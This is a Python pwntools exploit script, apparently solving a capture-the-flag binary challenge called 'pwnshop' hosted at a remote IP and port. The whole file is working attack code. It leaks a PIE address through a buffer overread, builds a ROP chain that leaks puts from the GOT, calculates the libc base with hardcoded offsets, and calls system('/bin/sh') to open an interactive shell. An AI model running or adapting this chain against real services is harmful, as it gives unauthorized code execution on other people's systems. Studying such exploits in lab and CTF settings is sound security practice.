from pwn import *

# b *puts
gs = '''
continue
'''

elf = context.binary = ELF("./pwnshop")
libc = ELF('/usr/lib/libc.so.6')

def start():
    if args.REMOTE:
        return remote("94.237.63.201", 49222)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

offset = 72

io.sendlineafter("> ", "2".encode())
#io.sendlineafter("? ", b"A"*8)
#io.sendlineafter("? ", b"A"*8)
io.sendlineafter("? ", b"A"*40)

io.recvuntil(b"AAAAAAAA")

#io.recvuntil(b"BBBBBBBB")

leak_address = u64(io.recv(6).strip().ljust(8, b"\x00"))

print(f"Leak Address: {hex(leak_address)}")

pie = 0x40c0

elf.address = leak_address - pie

rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi'])[0]
pop_rsi_r15 = rop.find_gadget(['pop rsi'])[0]
##rax_special = rop.find_gadget(['test rax, rax'])[0]
sub_rsp_28 = 0x0000000000001219 + elf.address
main_address = 0x000010a0 + elf.address

print(f"[+] ret: {hex(ret)}")
print(f"[+] Pop rdi: {hex(pop_rdi)}")
print(f"[+] Pop rsi: {hex(pop_rsi_r15)}")
print(f"[+] Main Address: {hex(main_address)}")

#print("[+] Got: ", elf.got)
#print("[+] Plt: ", elf.plt)

payload = b"".join([
    b"A"*40,
    p64(pop_rdi),
    p64(elf.got.puts),
    p64(elf.plt.puts),
    p64(main_address),
    p64(sub_rsp_28), # Son por los 8 bytes de las A's en sell
])


io.sendlineafter("> ", "1".encode())
io.sendlineafter(": ", payload)

leak_puts = u64(io.recv(6).ljust(8, b"\x00"))

print(f"Leak puts: {hex(leak_puts)}")

if args.REMOTE:
    libc.address = leak_puts - 0x6f6a0
    # libc6_2.23-0ubuntu11.2_amd64
    print(f"[+] System Address: {hex(libc.symbols.system)}")

    payload = b"".join([
        b"A"*40,
        p64(pop_rdi),
        p64(libc.address + 0x18ce17),
        p64(ret),
        p64(libc.address + 0x453a0),
        p64(sub_rsp_28)
    ])

else:
    libc.address = leak_puts - libc.symbols.puts

    print(f"[+] System Address: {hex(libc.symbols.system)}")

    payload = b"".join([
        b"A"*40,
        p64(pop_rdi),
        p64(next(libc.search(b"/bin/sh\x00"))),
        p64(ret),
        p64(libc.symbols.system),
        p64(sub_rsp_28)
    ])

io.sendlineafter("> ", "11".encode()) # 1 byte extra
io.sendlineafter(": ", payload)

io.interactive()
